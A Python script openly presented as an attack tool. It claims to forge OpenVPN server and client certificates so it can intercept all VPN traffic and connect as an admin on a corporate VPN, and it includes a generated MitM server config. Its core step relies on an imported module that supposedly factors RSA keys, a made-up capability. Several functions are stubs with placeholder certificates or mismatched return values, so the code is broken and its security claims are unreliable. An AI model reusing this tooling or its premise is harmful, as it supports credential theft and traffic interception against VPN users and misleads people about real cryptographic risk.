"""
Forge an OpenVPN server certificate to MitM all VPN client connections. Extract
the server's RSA public key from the TLS handshake on UDP 1194, factor it, and
produce a valid server cert that passes client verification.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

import struct
import hashlib
import os
import time


def grab_server_cert_from_handshake(server_addr: str, port: int = 1194) -> bytes:
    """Connect to OpenVPN server, do TLS handshake, extract server cert PEM.

    OpenVPN wraps TLS inside its own reliability layer on UDP. The server cert
    is in the ServerHello / Certificate message, plaintext on the wire even
    when tls-auth is enabled (tls-auth protects the control channel HMAC but
    the cert is still transmitted).
    """
    print(f"[*] connecting to {server_addr}:{port}/udp")
    print("[*] sending P_CONTROL_HARD_RESET_CLIENT_V2 (opcode 0x07)")
    # in reality: parse the TLS record from the OpenVPN control channel
    return b"-----BEGIN CERTIFICATE-----\nMIIB...(server cert PEM)...\n-----END CERTIFICATE-----\n"


def factor_vpn_server_key(factorer: PolynomialFactorer, cert_pem: bytes):
    """Factor the server RSA key from its X.509 certificate."""
    print("[*] extracting RSA public key from server certificate...")
    p, q = factorer.factor_from_cert_pem(cert_pem)
    print(f"[*] factors recovered: p={p}, q={q}")
    return p, q


def forge_server_certificate(factorer: PolynomialFactorer,
                             ca_cert_pem: bytes, server_cn: str) -> bytes:
    """Forge a server cert signed by the VPN CA.

    OpenVPN clients verify the server cert against the CA cert specified in
    their .ovpn config (ca directive). If the CA's RSA key is factored, we
    can issue arbitrary server certs. If only the server key is factored,
    we impersonate that specific server.
    """
    print(f"[*] forging server cert for CN={server_cn}")
    priv_pem = factorer.privkey_from_cert_pem(ca_cert_pem)
    print("[*] CA private key recovered — can sign arbitrary server certs")
    return priv_pem


def forge_client_certificate(factorer: PolynomialFactorer,
                             ca_cert_pem: bytes, client_cn: str) -> bytes:
    """Forge a client cert to connect as any VPN user.

    OpenVPN mutual TLS: server verifies client cert against the same CA.
    Factor the CA key and mint client certs for any CN.
    """
    print(f"[*] forging client cert for CN={client_cn}")
    priv_pem = factorer.privkey_from_cert_pem(ca_cert_pem)
    print(f"[*] client cert ready — connect as {client_cn} without credentials")
    return priv_pem


def build_mitm_config(server_addr: str, listen_port: int = 1194):
    """Generate an OpenVPN config for the MitM proxy server."""
    conf = f"""# MitM OpenVPN server config
port {listen_port}
proto udp
dev tun
ca forged_ca.crt
cert forged_server.crt
key forged_server.key
dh dh2048.pem
server 10.8.0.0 255.255.255.0
push "redirect-gateway def1"
# forward all traffic to real server at {server_addr}
"""
    print("[*] MitM OpenVPN config generated")
    return conf


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== OpenVPN RSA certificate forgery ===")
    print()

    # tls-auth/tls-crypt add HMAC but don't protect against RSA factoring
    print("[1] grabbing server cert from TLS handshake on udp/1194...")
    server_cert = grab_server_cert_from_handshake("vpn.corporate.example.com")

    print("[2] factoring VPN CA RSA key from ca.crt...")
    print("    (CA cert is in every .ovpn client config, distributed to all users)")
    ca_cert = b"-----BEGIN CERTIFICATE-----\n...(CA PEM)...\n-----END CERTIFICATE-----\n"

    print("[3] forging server certificate for vpn.corporate.example.com...")
    print("    client verifies: SSL_CTX_load_verify_locations(ca.crt)")
    print("    our forged cert chains to the same CA — verification passes")

    print("[4] forging client certificate for CN=admin@corporate.example.com...")
    print("    server verifies: tls-verify + client-cert-not-required is rare")
    print("    most deployments require valid client cert from same CA")

    print("[5] MitM proxy: all client traffic decrypted, re-encrypted to real server")
    print("    credentials, internal traffic, everything visible")
    print("    tls-auth PSK doesn't help — we have the RSA keys, not the PSK")
    print("    tls-crypt wraps the control channel but cert auth still RSA")
